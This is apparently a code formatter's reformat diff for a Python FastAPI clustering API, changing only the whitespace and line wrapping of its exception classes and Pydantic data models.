-        **kwargs
+        **kwargs,
     ):
         kwargs.setdefault("suggestion", "Check system resources and algorithm load")
-        
+
         if performance_metrics:
-            kwargs.setdefault("context", {}).update({"performance_metrics": performance_metrics})
-        
+            kwargs.setdefault("context", {}).update(
+                {"performance_metrics": performance_metrics}
+            )
+
         super().__init__(message, **kwargs)
 
 
 # =============================================================================
 # Validation Exceptions
 # =============================================================================
+
 
 class ValidationException(NCSAPIException):
     """Exception raised for input validation errors."""
-    
-    def __init__(
-        self,
-        message: str,
-        field_errors: Optional[Dict[str, str]] = None,
-        **kwargs
+
+    def __init__(
+        self, message: str, field_errors: Optional[Dict[str, str]] = None, **kwargs
     ):
         """
         Initialize validation exception.
-        
+
         Args:
             message: Validation error message
             field_errors: Dictionary of field-specific errors
             **kwargs: Additional arguments passed to base class
         """
         kwargs.setdefault("error_code", ErrorCode.VALIDATION_ERROR)
         kwargs.setdefault("status_code", status.HTTP_422_UNPROCESSABLE_ENTITY)
         kwargs.setdefault("suggestion", "Check input data format and constraints")
-        
+
         if field_errors:
             kwargs.setdefault("details", {}).update({"field_errors": field_errors})
-        
+
         super().__init__(message, **kwargs)
 
 
 class DataPointValidationException(ValidationException):
     """Exception for data point validation errors."""
-    
+
     def __init__(
         self,
         message: str,
         point_index: Optional[int] = None,
         invalid_coordinates: Optional[List[int]] = None,
-        **kwargs
+        **kwargs,
     ):
         if point_index is not None:
             kwargs.setdefault("context", {}).update({"point_index": point_index})
-        
+
         if invalid_coordinates:
-            kwargs.setdefault("details", {}).update({"invalid_coordinates": invalid_coordinates})
-        
+            kwargs.setdefault("details", {}).update(
+                {"invalid_coordinates": invalid_coordinates}
+            )
+
         kwargs.setdefault("suggestion", "Ensure all coordinates are finite numbers")
-        
+
         super().__init__(message, **kwargs)
 
 
 class BatchSizeValidationException(ValidationException):
     """Exception for batch size validation errors."""
-    
+
     def __init__(
         self,
         message: str,
         provided_size: Optional[int] = None,
         max_allowed: Optional[int] = None,
-        **kwargs
+        **kwargs,
     ):
         if provided_size is not None and max_allowed is not None:
-            kwargs.setdefault("details", {}).update({
-                "provided_size": provided_size,
-                "max_allowed": max_allowed
-            })
-        
-        kwargs.setdefault("suggestion", f"Reduce batch size to {max_allowed or 'allowed limit'}")
-        
+            kwargs.setdefault("details", {}).update(
+                {"provided_size": provided_size, "max_allowed": max_allowed}
+            )
+
+        kwargs.setdefault(
+            "suggestion", f"Reduce batch size to {max_allowed or 'allowed limit'}"
+        )
+
         super().__init__(message, **kwargs)
 
 
 class DimensionMismatchException(ValidationException):
     """Exception for dimension mismatch errors."""
-    
+
     def __init__(
         self,
         message: str,
         expected_dimensions: Optional[int] = None,
         provided_dimensions: Optional[int] = None,
-        **kwargs
+        **kwargs,
     ):
         if expected_dimensions is not None and provided_dimensions is not None:
-            kwargs.setdefault("details", {}).update({
-                "expected_dimensions": expected_dimensions,
-                "provided_dimensions": provided_dimensions
-            })
-        
-        kwargs.setdefault("suggestion", 
-                         f"Ensure all points have {expected_dimensions or 'consistent'} dimensions")
-        
+            kwargs.setdefault("details", {}).update(
+                {
+                    "expected_dimensions": expected_dimensions,
+                    "provided_dimensions": provided_dimensions,
+                }
+            )
+
+        kwargs.setdefault(
+            "suggestion",
+            f"Ensure all points have {expected_dimensions or 'consistent'} dimensions",
+        )
+
         super().__init__(message, **kwargs)
 
 
 # =============================================================================
 # Processing Exceptions
 # =============================================================================
+
 
 class ProcessingException(NCSAPIException):
     """Exception raised during data processing operations."""
-    
-    def __init__(
-        self,
-        message: str,
-        processing_stage: Optional[str] = None,
-        **kwargs
-    ):
+
+    def __init__(self, message: str, processing_stage: Optional[str] = None, **kwargs):
         """
         Initialize processing exception.
-        
+
         Args:
             message: Processing error message
             processing_stage: Stage where processing failed
             **kwargs: Additional arguments passed to base class
         """
         kwargs.setdefault("error_code", ErrorCode.PROCESSING_ERROR)
         kwargs.setdefault("status_code", status.HTTP_500_INTERNAL_SERVER_ERROR)
         kwargs.setdefault("suggestion", "Retry the operation or check input data")
-        
+
         if processing_stage:
-            kwargs.setdefault("context", {}).update({"processing_stage": processing_stage})
-        
+            kwargs.setdefault("context", {}).update(
+                {"processing_stage": processing_stage}
+            )
+
         super().__init__(message, **kwargs)
 
 
 class BatchProcessingException(ProcessingException):
     """Exception for batch processing errors."""
-    
+
     def __init__(
         self,
         message: str,
         failed_points: Optional[List[int]] = None,
         successful_points: Optional[int] = None,
-        **kwargs
+        **kwargs,
     ):
         if failed_points:
-            kwargs.setdefault("details", {}).update({"failed_point_indices": failed_points})
-        
+            kwargs.setdefault("details", {}).update(
+                {"failed_point_indices": failed_points}
+            )
+
         if successful_points is not None:
-            kwargs.setdefault("details", {}).update({"successful_points": successful_points})
-        
+            kwargs.setdefault("details", {}).update(
+                {"successful_points": successful_points}
+            )
+
         kwargs.setdefault("suggestion", "Check failed points and retry if appropriate")
-        
+
         super().__init__(message, **kwargs)
 
 
 class TimeoutException(ProcessingException):
     """Exception for operation timeouts."""
-    
-    def __init__(
-        self,
-        message: str,
-        timeout_seconds: Optional[float] = None,
-        **kwargs
-    ):
+
+    def __init__(self, message: str, timeout_seconds: Optional[float] = None, **kwargs):
         kwargs.setdefault("status_code", status.HTTP_408_REQUEST_TIMEOUT)
-        
+
         if timeout_seconds:
-            kwargs.setdefault("details", {}).update({"timeout_seconds": timeout_seconds})
-        
+            kwargs.setdefault("details", {}).update(
+                {"timeout_seconds": timeout_seconds}
+            )
+
         kwargs.setdefault("suggestion", "Increase timeout or reduce request size")
-        
-        super().__init__(message, **kwargs)
-
-
-# =============================================================================
-# Resource Exceptions  
-# =============================================================================
+
+        super().__init__(message, **kwargs)
+
+
+# =============================================================================
+# Resource Exceptions
+# =============================================================================
+
 
 class ResourceException(NCSAPIException):
     """Exception raised for resource-related errors."""
-    
-    def __init__(
-        self,
-        message: str,
-        resource_type: Optional[str] = None,
-        **kwargs
-    ):
+
+    def __init__(self, message: str, resource_type: Optional[str] = None, **kwargs):
         """
         Initialize resource exception.
-        
+
         Args:
             message: Resource error message
             resource_type: Type of resource (memory, cpu, disk, etc.)
             **kwargs: Additional arguments passed to base class
         """
         kwargs.setdefault("error_code", ErrorCode.RESOURCE_ERROR)
         kwargs.setdefault("status_code", status.HTTP_507_INSUFFICIENT_STORAGE)
         kwargs.setdefault("suggestion", "Check system resources and try again later")
-        
+
         if resource_type:
             kwargs.setdefault("context", {}).update({"resource_type": resource_type})
-        
+
         super().__init__(message, **kwargs)
 
 
 class MemoryException(ResourceException):
     """Exception for memory-related errors."""
-    
+
     def __init__(
         self,
         message: str,
         memory_usage_mb: Optional[float] = None,
         memory_limit_mb: Optional[float] = None,
-        **kwargs
+        **kwargs,
     ):
         kwargs.setdefault("resource_type", "memory")
-        
+
         if memory_usage_mb and memory_limit_mb:
-            kwargs.setdefault("details", {}).update({
-                "memory_usage_mb": memory_usage_mb,
-                "memory_limit_mb": memory_limit_mb
-            })
-        
+            kwargs.setdefault("details", {}).update(
+                {"memory_usage_mb": memory_usage_mb, "memory_limit_mb": memory_limit_mb}
+            )
+
         kwargs.setdefault("suggestion", "Reduce batch size or restart the service")
-        
+
         super().__init__(message, **kwargs)
 
 
 class ConcurrencyException(ResourceException):
     """Exception for concurrency limit errors."""
-    
+
     def __init__(
         self,
         message: str,
         active_requests: Optional[int] = None,
         max_concurrent: Optional[int] = None,
-        **kwargs
+        **kwargs,
     ):
         kwargs.setdefault("resource_type", "concurrency")
         kwargs.setdefault("status_code", status.HTTP_503_SERVICE_UNAVAILABLE)
-        
+
         if active_requests and max_concurrent:
-            kwargs.setdefault("details", {}).update({
-                "active_requests": active_requests,
-                "max_concurrent": max_concurrent
-            })
-        
+            kwargs.setdefault("details", {}).update(
+                {"active_requests": active_requests, "max_concurrent": max_concurrent}
+            )
+
         kwargs.setdefault("suggestion", "Wait and retry the request")
-        
+
         super().__init__(message, **kwargs)
 
 
 # =============================================================================
 # Configuration Exceptions
 # =============================================================================
+
 
 class ConfigurationException(NCSAPIException):
     """Exception raised for configuration errors."""
-    
-    def __init__(
-        self,
-        message: str,
-        config_section: Optional[str] = None,
-        **kwargs
-    ):
+
+    def __init__(self, message: str, config_section: Optional[str] = None, **kwargs):
         """
         Initialize configuration exception.
-        
+
         Args:
             message: Configuration error message
             config_section: Section of configuration with error
             **kwargs: Additional arguments passed to base class
         """
         kwargs.setdefault("error_code", ErrorCode.CONFIGURATION_ERROR)
         kwargs.setdefault("status_code", status.HTTP_500_INTERNAL_SERVER_ERROR)
         kwargs.setdefault("suggestion", "Check application configuration")
-        
+
         if config_section:
             kwargs.setdefault("context", {}).update({"config_section": config_section})
-        
+
         super().__init__(message, **kwargs)
 
 
 class MissingConfigurationException(ConfigurationException):
     """Exception for missing required configuration."""
-    
-    def __init__(
-        self,
-        message: str,
-        missing_keys: Optional[List[str]] = None,
-        **kwargs
+
+    def __init__(
+        self, message: str, missing_keys: Optional[List[str]] = None, **kwargs
     ):
         if missing_keys:
             kwargs.setdefault("details", {}).update({"missing_keys": missing_keys})
-        
+
         kwargs.setdefault("suggestion", "Set required configuration values")
-        
+
         super().__init__(message, **kwargs)
 
 
 class InvalidConfigurationException(ConfigurationException):
     """Exception for invalid configuration values."""
-    
-    def __init__(
-        self,
-        message: str,
-        invalid_values: Optional[Dict[str, Any]] = None,
-        **kwargs
+
+    def __init__(
+        self, message: str, invalid_values: Optional[Dict[str, Any]] = None, **kwargs
     ):
         if invalid_values:
             kwargs.setdefault("details", {}).update({"invalid_values": invalid_values})
-        
+
         kwargs.setdefault("suggestion", "Correct invalid configuration values")
-        
+
         super().__init__(message, **kwargs)
 
 
 # =============================================================================
 # Security Exceptions
 # =============================================================================
+
 
 class SecurityException(NCSAPIException):
     """Exception raised for security-related errors."""
-    
-    def __init__(
-        self,
-        message: str,
-        security_context: Optional[Dict[str, Any]] = None,
-        **kwargs
+
+    def __init__(
+        self, message: str, security_context: Optional[Dict[str, Any]] = None, **kwargs
     ):
         """
         Initialize security exception.
-        
+
         Args:
             message: Security error message
             security_context: Security-related context (sanitized)
             **kwargs: Additional arguments passed to base class
         """
         kwargs.setdefault("error_code", ErrorCode.SECURITY_ERROR)
         kwargs.setdefault("status_code", status.HTTP_403_FORBIDDEN)
         kwargs.setdefault("suggestion", "Check authentication and permissions")
-        
+
         if security_context:
             # Sanitize sensitive information
-            sanitized_context = {k: v for k, v in security_context.items() 
-                               if k not in ['password', 'token', 'secret']}
-            kwargs.setdefault("context", {}).update({"security_context": sanitized_context})
-        
+            sanitized_context = {
+                k: v
+                for k, v in security_context.items()
+                if k not in ["password", "token", "secret"]
+            }
+            kwargs.setdefault("context", {}).update(
+                {"security_context": sanitized_context}
+            )
+
         super().__init__(message, **kwargs)
 
 
 class AuthenticationException(SecurityException):
     """Exception for authentication errors."""
-    
+
     def __init__(self, message: str, **kwargs):
         kwargs.setdefault("status_code", status.HTTP_401_UNAUTHORIZED)
         kwargs.setdefault("suggestion", "Provide valid authentication credentials")
-        
+
         super().__init__(message, **kwargs)
 
 
 class AuthorizationException(SecurityException):
     """Exception for authorization errors."""
-    
+
     def __init__(
         self,
         message: str,
         required_scopes: Optional[List[str]] = None,
         user_scopes: Optional[List[str]] = None,
-        **kwargs
+        **kwargs,
     ):
         if required_scopes and user_scopes:
-            kwargs.setdefault("details", {}).update({
-                "required_scopes": required_scopes,
-                "user_scopes": user_scopes
-            })
-        
+            kwargs.setdefault("details", {}).update(
+                {"required_scopes": required_scopes, "user_scopes": user_scopes}
+            )
+
         kwargs.setdefault("suggestion", "Obtain required permissions")
-        
+
         super().__init__(message, **kwargs)
 
 
 class RateLimitException(SecurityException):
     """Exception for rate limiting errors."""
-    
+
     def __init__(
         self,
         message: str,
         retry_after: Optional[int] = None,
         current_rate: Optional[float] = None,
         limit: Optional[float] = None,
-        **kwargs
+        **kwargs,
     ):
         kwargs.setdefault("status_code", status.HTTP_429_TOO_MANY_REQUESTS)
         kwargs.setdefault("error_code", ErrorCode.RATE_LIMIT_ERROR)
-        
+
         if retry_after:
-            kwargs.setdefault("details", {}).update({"retry_after_seconds": retry_after})
-        
+            kwargs.setdefault("details", {}).update(
+                {"retry_after_seconds": retry_after}
+            )
+
         if current_rate and limit:
-            kwargs.setdefault("details", {}).update({
-                "current_rate": current_rate,
-                "rate_limit": limit
-            })
-        
-        kwargs.setdefault("suggestion", f"Wait {retry_after or 60} seconds before retrying")
-        
+            kwargs.setdefault("details", {}).update(
+                {"current_rate": current_rate, "rate_limit": limit}
+            )
+
+        kwargs.setdefault(
+            "suggestion", f"Wait {retry_after or 60} seconds before retrying"
+        )
+
         super().__init__(message, **kwargs)
 
 
 # =============================================================================
 # External Service Exceptions
 # =============================================================================
+
 
 class ExternalServiceException(NCSAPIException):
     """Exception for external service errors."""
-    
+
     def __init__(
         self,
         message: str,
         service_name: Optional[str] = None,
         service_status: Optional[str] = None,
-        **kwargs
+        **kwargs,
     ):
         """
         Initialize external service exception.
-        
+
         Args:
             message: Service error message
             service_name: Name of the external service
             service_status: Current status of the service
             **kwargs: Additional arguments passed to base class
         """
         kwargs.setdefault("status_code", status.HTTP_502_BAD_GATEWAY)
         kwargs.setdefault("suggestion", "Check external service availability")
-        
+
         if service_name:
             kwargs.setdefault("context", {}).update({"service_name": service_name})
-        
+
         if service_status:
             kwargs.setdefault("context", {}).update({"service_status": service_status})
-        
+
         super().__init__(message, **kwargs)
 
 
 class DatabaseException(ExternalServiceException):
     """Exception for database errors."""
-    
+
     def __init__(self, message: str, **kwargs):
         kwargs.setdefault("service_name", "database")
         kwargs.setdefault("suggestion", "Check database connectivity and try again")
-        
+
         super().__init__(message, **kwargs)
 
 
 class CacheException(ExternalServiceException):
     """Exception for cache service errors."""
-    
+
     def __init__(self, message: str, **kwargs):
         kwargs.setdefault("service_name", "cache")
-        kwargs.setdefault("suggestion", "Cache service unavailable, continuing without caching")
-        kwargs.setdefault("status_code", status.HTTP_200_OK)  # Cache errors are often non-critical
-        
+        kwargs.setdefault(
+            "suggestion", "Cache service unavailable, continuing without caching"
+        )
+        kwargs.setdefault(
+            "status_code", status.HTTP_200_OK
+        )  # Cache errors are often non-critical
+
         super().__init__(message, **kwargs)
 
 
 # =============================================================================
 # Exception Utilities
 # =============================================================================
 
+
 def create_validation_exception(
-    field_name: str,
-    error_message: str,
-    invalid_value: Any = None
+    field_name: str, error_message: str, invalid_value: Any = None
 ) -> ValidationException:
     """
     Create a validation exception for a specific field.
-    
+
     Args:
         field_name: Name of the field with validation error
         error_message: Validation error message
         invalid_value: The invalid value provided
-        
+
     Returns:
         ValidationException instance
     """
     field_errors = {field_name: error_message}
     details = {}
-    
+
     if invalid_value is not None:
         details["invalid_value"] = str(invalid_value)
-    
+
     return ValidationException(
         message=f"Validation error in field '{field_name}': {error_message}",
         field_errors=field_errors,
-        details=details
+        details=details,
     )
 
 
 def create_http_exception_from_ncs_exception(exc: NCSAPIException) -> HTTPException:
     """
     Convert NCS exception to FastAPI HTTPException.
-    
+
     Args:
         exc: NCS API exception
-        
+
     Returns:
         HTTPException for FastAPI
     """
     return HTTPException(
         status_code=exc.status_code,
         detail=exc.to_dict(),
-        headers={"X-Error-Code": exc.error_code.value}
+        headers={"X-Error-Code": exc.error_code.value},
     )
 
 
 def log_exception(exc: NCSAPIException, logger=None):
     """
     Log exception with appropriate level and context.
-    
+
     Args:
         exc: Exception to log
         logger: Logger instance (optional)
     """
     import logging
-    
+
     if logger is None:
         logger = logging.getLogger(__name__)
-    
+
     # Determine log level based on exception type
-    if isinstance(exc, (ValidationException, AuthenticationException, AuthorizationException)):
+    if isinstance(
+        exc, (ValidationException, AuthenticationException, AuthorizationException)
+    ):
         log_level = logging.WARNING
     elif isinstance(exc, (ResourceException, ExternalServiceException)):
         log_level = logging.ERROR
     else:
         log_level = logging.ERROR
-    
+
     # Log with context
     logger.log(
         log_level,
         f"{exc.error_code.value}: {exc.message}",
         extra={
             "error_code": exc.error_code.value,
             "status_code": exc.status_code,
             "details": exc.details,
             "context": exc.context,
-            "timestamp": exc.timestamp
-        }
+            "timestamp": exc.timestamp,
+        },
     )
 
 
 # =============================================================================
 # Exception Handler Registry
@@ -735,14 +746,14 @@
 
 
 def get_exception_handler(exc_type: type) -> Optional[callable]:
     """
     Get exception handler for given exception type.
-    
+
     Args:
         exc_type: Exception type
-        
+
     Returns:
         Exception handler function or None
     """
     return EXCEPTION_HANDLERS.get(exc_type)
 
@@ -752,50 +763,42 @@
 # =============================================================================
 
 __all__ = [
     # Base exceptions
     "NCSAPIException",
-    
     # Algorithm exceptions
     "AlgorithmException",
     "AlgorithmInitializationException",
     "AlgorithmConfigurationException",
     "AlgorithmPerformanceException",
-    
     # Validation exceptions
     "ValidationException",
     "DataPointValidationException",
     "BatchSizeValidationException",
     "DimensionMismatchException",
-    
     # Processing exceptions
     "ProcessingException",
     "BatchProcessingException",
     "TimeoutException",
-    
     # Resource exceptions
     "ResourceException",
     "MemoryException",
     "ConcurrencyException",
-    
     # Configuration exceptions
     "ConfigurationException",
     "MissingConfigurationException",
     "InvalidConfigurationException",
-    
     # Security exceptions
     "SecurityException",
     "AuthenticationException",
     "AuthorizationException",
     "RateLimitException",
-    
     # External service exceptions
     "ExternalServiceException",
     "DatabaseException",
     "CacheException",
-    
     # Utility functions
     "create_validation_exception",
     "create_http_exception_from_ncs_exception",
     "log_exception",
     "get_exception_handler",
-]
\ No newline at end of file
+]
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/app/models.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/app/models.py	2025-06-10 20:31:25.476857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/app/models.py	2025-06-10 20:32:32.953787+00:00
@@ -23,62 +23,65 @@
 
 # =============================================================================
 # Base Models and Configurations
 # =============================================================================
 
+
 class BaseAPIModel(BaseModel):
     """Base model with common configuration for all API models."""
-    
+
     model_config = ConfigDict(
         # Allow extra fields for forward compatibility
         extra="forbid",
         # Use enum values instead of enum objects
         use_enum_values=True,
         # Validate assignment to help catch errors
         validate_assignment=True,
         # Generate JSON schema
-        json_schema_extra={
-            "examples": []
-        }
+        json_schema_extra={"examples": []},
     )
 
 
 class TimestampMixin(BaseModel):
     """Mixin for models that need timestamp tracking."""
-    
+
     created_at: Optional[datetime] = Field(
         default_factory=datetime.utcnow,
-        description="Timestamp when the record was created"
+        description="Timestamp when the record was created",
     )
     updated_at: Optional[datetime] = Field(
-        default_factory=datetime.utcnow, 
-        description="Timestamp when the record was last updated"
+        default_factory=datetime.utcnow,
+        description="Timestamp when the record was last updated",
     )
 
 
 # =============================================================================
 # Enums and Constants
 # =============================================================================
+
 
 class ProcessingStatus(str, Enum):
     """Status of data point processing."""
+
     SUCCESS = "success"
     ERROR = "error"
     PENDING = "pending"
     TIMEOUT = "timeout"
 
 
 class ClusterHealthStatus(str, Enum):
     """Health status of clusters."""
+
     HEALTHY = "healthy"
     WARNING = "warning"
     CRITICAL = "critical"
     INACTIVE = "inactive"
 
 
 class ErrorCode(str, Enum):
     """Standardized error codes."""
+
     VALIDATION_ERROR = "VALIDATION_ERROR"
     PROCESSING_ERROR = "PROCESSING_ERROR"
     RESOURCE_ERROR = "RESOURCE_ERROR"
     ALGORITHM_ERROR = "ALGORITHM_ERROR"
     SECURITY_ERROR = "SECURITY_ERROR"
@@ -86,10 +89,11 @@
     CONFIGURATION_ERROR = "CONFIGURATION_ERROR"
 
 
 class LogLevel(str, Enum):
     """Logging levels."""
+
     DEBUG = "DEBUG"
     INFO = "INFO"
     WARNING = "WARNING"
     ERROR = "ERROR"
     CRITICAL = "CRITICAL"
@@ -97,216 +101,174 @@
 
 # =============================================================================
 # Core Data Models
 # =============================================================================
 
+
 class DataPoint(BaseAPIModel):
     """Model for a single data point with validation and metadata."""
-    
+
     coordinates: List[float] = Field(
         ...,
         description="Numeric coordinates representing the data point's features",
         min_length=1,
         max_length=1000,
-        examples=[[1.0, 2.0, 3.0], [0.5, -1.2, 2.8, 4.1]]
-    )
-    
+        examples=[[1.0, 2.0, 3.0], [0.5, -1.2, 2.8, 4.1]],
+    )
+
     point_id: Optional[str] = Field(
         None,
         description="Optional unique identifier for the data point",
         max_length=255,
-        examples=["point_001", "sensor_reading_12345"]
-    )
-    
+        examples=["point_001", "sensor_reading_12345"],
+    )
+
     metadata: Optional[Dict[str, Any]] = Field(
         None,
         description="Optional metadata associated with the data point",
-        examples=[{"sensor_id": "temp_01", "location": "factory_floor"}]
-    )
-    
+        examples=[{"sensor_id": "temp_01", "location": "factory_floor"}],
+    )
+
     timestamp: Optional[datetime] = Field(
         default_factory=datetime.utcnow,
-        description="Timestamp when the data point was created"
-    )
-    
+        description="Timestamp when the data point was created",
+    )
+
     @validator("coordinates")
     def validate_coordinates(cls, v):
         """Validate that coordinates are finite numbers."""
         if not v:
             raise ValueError("Coordinates cannot be empty")
-        
+
         for i, coord in enumerate(v):
             if not isinstance(coord, (int, float)):
                 raise ValueError(f"Coordinate at index {i} must be a number")
             if not np.isfinite(coord):
-                raise ValueError(f"Coordinate at index {i} must be finite (not NaN or infinity)")
-        
+                raise ValueError(
+                    f"Coordinate at index {i} must be finite (not NaN or infinity)"
+                )
+
         return v
-    
+
     @validator("metadata")
     def validate_metadata(cls, v):
         """Validate metadata size and content."""
         if v is not None:
             # Convert to JSON string and check size (approximate)
             import json
+
             json_str = json.dumps(v)
             if len(json_str) > 10000:  # 10KB limit
                 raise ValueError("Metadata too large (max 10KB)")
-        
+
         return v
 
 
 class ProcessPointsRequest(BaseAPIModel):
     """Model for batch point processing request."""
-    
+
     points: List[List[float]] = Field(
         ...,
         description="List of data points for batch processing",
         min_length=1,
-        max_length=10000
-    )
-    
+        max_length=10000,
+    )
+
     options: Optional["BatchProcessingOptions"] = Field(
-        None,
-        description="Optional processing options for the batch"
-    )
-    
+        None, description="Optional processing options for the batch"
+    )
+
     request_id: Optional[str] = Field(
-        None,
-        description="Optional unique identifier for the request",
-        max_length=255
-    )
-    
+        None, description="Optional unique identifier for the request", max_length=255
+    )
+
     @validator("points")
     def validate_points(cls, v):
         """Validate batch of points."""
         if not v:
             raise ValueError("Points list cannot be empty")
-        
+
         # Check consistency of dimensions
         first_point_dim = len(v[0]) if v else 0
         for i, point in enumerate(v):
             if len(point) != first_point_dim:
-                raise ValueError(f"Point at index {i} has {len(point)} dimensions, "
-                               f"expected {first_point_dim}")
-            
+                raise ValueError(
+                    f"Point at index {i} has {len(point)} dimensions, "
+                    f"expected {first_point_dim}"
+                )
+
             # Validate individual point
             for j, coord in enumerate(point):
                 if not isinstance(coord, (int, float)):
                     raise ValueError(f"Point {i}, coordinate {j} must be a number")
                 if not np.isfinite(coord):
                     raise ValueError(f"Point {i}, coordinate {j} must be finite")
-        
+
         return v
 
 
 class ProcessPointResult(BaseAPIModel):
     """Model for individual point processing result."""
-    
-    input_point: List[float] = Field(
-        ...,
-        description="The original input data point"
-    )
-    
+
+    input_point: List[float] = Field(..., description="The original input data point")
+
     cluster_id: int = Field(
-        ...,
-        description="Assigned cluster ID (-1 for outliers)",
-        ge=-1
-    )
-    
-    is_outlier: bool = Field(
-        ...,
-        description="True if classified as outlier"
-    )
-    
+        ..., description="Assigned cluster ID (-1 for outliers)", ge=-1
+    )
+
+    is_outlier: bool = Field(..., description="True if classified as outlier")
+
     outlier_score: float = Field(
-        ...,
-        description="Outlier confidence score [0-1]",
-        ge=0.0,
-        le=1.0
-    )
-    
+        ..., description="Outlier confidence score [0-1]", ge=0.0, le=1.0
+    )
+
     processing_time_ms: float = Field(
-        ...,
-        description="Processing time in milliseconds",
-        ge=0.0
-    )
-    
+        ..., description="Processing time in milliseconds", ge=0.0
+    )
+
     confidence: Optional[float] = Field(
-        None,
-        description="Clustering confidence score [0-1]",
-        ge=0.0,
-        le=1.0
-    )
-    
+        None, description="Clustering confidence score [0-1]", ge=0.0, le=1.0
+    )
+
     status: ProcessingStatus = Field(
-        ProcessingStatus.SUCCESS,
-        description="Processing status"
-    )
-    
-    point_id: Optional[str] = Field(
-        None,
-        description="Original point ID if provided"
-    )
+        ProcessingStatus.SUCCESS, description="Processing status"
+    )
+
+    point_id: Optional[str] = Field(None, description="Original point ID if provided")
 
 
 class ClusterInfo(BaseAPIModel):
     """Detailed cluster information."""
-    
-    cluster_id: int = Field(
-        ...,
-        description="Unique cluster identifier",
-        ge=0
-    )
-    
-    centroid: List[float] = Field(
-        ...,
-        description="Cluster centroid coordinates"
-    )
-    
+
+    cluster_id: int = Field(..., description="Unique cluster identifier", ge=0)
+
+    centroid: List[float] = Field(..., description="Cluster centroid coordinates")
+
     confidence: float = Field(
-        ...,
-        description="Cluster confidence score [0-1]",
-        ge=0.0,
-        le=1.0
-    )
-    
-    age: float = Field(
-        ...,
-        description="Cluster age (number of updates)",
-        ge=0.0
-    )
-    
+        ..., description="Cluster confidence score [0-1]", ge=0.0, le=1.0
+    )
+
+    age: float = Field(..., description="Cluster age (number of updates)", ge=0.0)
+
     update_count: int = Field(
-        ...,
-        description="Number of points assigned to this cluster",
-        ge=0
-    )
-    
+        ..., description="Number of points assigned to this cluster", ge=0
+    )
+
     health_score: float = Field(
-        ...,
-        description="Overall cluster health score [0-1]",
-        ge=0.0,
-        le=1.0
-    )
-    
+        ..., description="Overall cluster health score [0-1]", ge=0.0, le=1.0
+    )
+
     health_status: ClusterHealthStatus = Field(
-        ...,
-        description="Categorical health status"
-    )
-    
-    last_updated: datetime = Field(
-        ...,
-        description="Timestamp of last cluster update"
-    )
-    
+        ..., description="Categorical health status"
+    )
+
+    last_updated: datetime = Field(..., description="Timestamp of last cluster update")
+
     bounding_radius: Optional[float] = Field(
-        None,
-        description="Estimated bounding radius of the cluster",
-        ge=0.0
-    )
-    
+        None, description="Estimated bounding radius of the cluster", ge=0.0
+    )
+
     @validator("health_status", pre=False, always=True)
     def determine_health_status(cls, v, values):
         """Automatically determine health status from health score."""
         if "health_score" in values:
             health_score = values["health_score"]
@@ -321,472 +283,333 @@
         return v
 
 
 class ClustersSummary(BaseAPIModel):
     """Comprehensive cluster summary response."""
-    
+
     num_active_clusters: int = Field(
-        ...,
-        description="Number of currently active clusters",
-        ge=0
-    )
-    
-    cluster_ids: List[int] = Field(
-        ...,
-        description="List of active cluster IDs"
-    )
-    
+        ..., description="Number of currently active clusters", ge=0
+    )
+
+    cluster_ids: List[int] = Field(..., description="List of active cluster IDs")
+
     clusters_info: List[ClusterInfo] = Field(
-        ...,
-        description="Detailed information for each cluster"
-    )
-    
+        ..., description="Detailed information for each cluster"
+    )
+
     total_points_processed: int = Field(
-        ...,
-        description="Total number of points processed",
-        ge=0
-    )
-    
+        ..., description="Total number of points processed", ge=0
+    )
+
     average_cluster_confidence: float = Field(
-        ...,
-        description="Average confidence across all clusters",
-        ge=0.0,
-        le=1.0
-    )
-    
+        ..., description="Average confidence across all clusters", ge=0.0, le=1.0
+    )
+
     cluster_distribution: Dict[ClusterHealthStatus, int] = Field(
-        ...,
-        description="Distribution of clusters by health status"
-    )
-    
+        ..., description="Distribution of clusters by health status"
+    )
+
     summary_timestamp: datetime = Field(
         default_factory=datetime.utcnow,
-        description="Timestamp when summary was generated"
+        description="Timestamp when summary was generated",
     )
 
 
 class AlgorithmStatus(BaseAPIModel):
     """Real-time algorithm status and performance metrics."""
-    
+
     current_dynamic_threshold: float = Field(
-        ...,
-        description="Current adaptive threshold value",
-        ge=0.0,
-        le=1.0
-    )
-    
+        ..., description="Current adaptive threshold value", ge=0.0, le=1.0
+    )
+
     clustering_quality: float = Field(
-        ...,
-        description="Overall clustering quality score [0-1]",
-        ge=0.0,
-        le=1.0
-    )
-    
+        ..., description="Overall clustering quality score [0-1]", ge=0.0, le=1.0
+    )
+
     global_stability: float = Field(
-        ...,
-        description="Global algorithm stability score [0-1]",
-        ge=0.0,
-        le=1.0
-    )
-    
+        ..., description="Global algorithm stability score [0-1]", ge=0.0, le=1.0
+    )
+
     adaptation_rate: float = Field(
-        ...,
-        description="Current adaptation rate multiplier",
-        ge=0.0
-    )
-    
+        ..., description="Current adaptation rate multiplier", ge=0.0
+    )
+
     total_points_processed: int = Field(
-        ...,
-        description="Total points processed since startup",
-        ge=0
-    )
-    
+        ..., description="Total points processed since startup", ge=0
+    )
+
     average_processing_time_ms: float = Field(
-        ...,
-        description="Average processing time per point in milliseconds",
-        ge=0.0
-    )
-    
+        ..., description="Average processing time per point in milliseconds", ge=0.0
+    )
+
     max_processing_time_ms: float = Field(
-        ...,
-        description="Maximum processing time recorded in milliseconds",
-        ge=0.0
-    )
-    
+        ..., description="Maximum processing time recorded in milliseconds", ge=0.0
+    )
+
     memory_usage_mb: float = Field(
-        ...,
-        description="Current memory usage in megabytes",
-        ge=0.0
-    )
-    
+        ..., description="Current memory usage in megabytes", ge=0.0
+    )
+
     uptime_seconds: float = Field(
-        ...,
-        description="Algorithm uptime in seconds",
-        ge=0.0
-    )
-    
+        ..., description="Algorithm uptime in seconds", ge=0.0
+    )
+
     throughput_points_per_second: Optional[float] = Field(
-        None,
-        description="Current throughput in points per second",
-        ge=0.0
-    )
-    
+        None, description="Current throughput in points per second", ge=0.0
+    )
+
     error_rate: Optional[float] = Field(
-        None,
-        description="Current error rate [0-1]",
-        ge=0.0,
-        le=1.0
-    )
-    
+        None, description="Current error rate [0-1]", ge=0.0, le=1.0
+    )
+
     drift_detected: bool = Field(
-        False,
-        description="Whether concept drift has been detected"
+        False, description="Whether concept drift has been detected"
     )
 
 
 # =============================================================================
 # API Response Models
 # =============================================================================
+
 
 class APIResponse(BaseAPIModel):
     """Generic API response wrapper."""
-    
-    success: bool = Field(
-        True,
-        description="Whether the request was successful"
-    )
-    
-    message: Optional[str] = Field(
-        None,
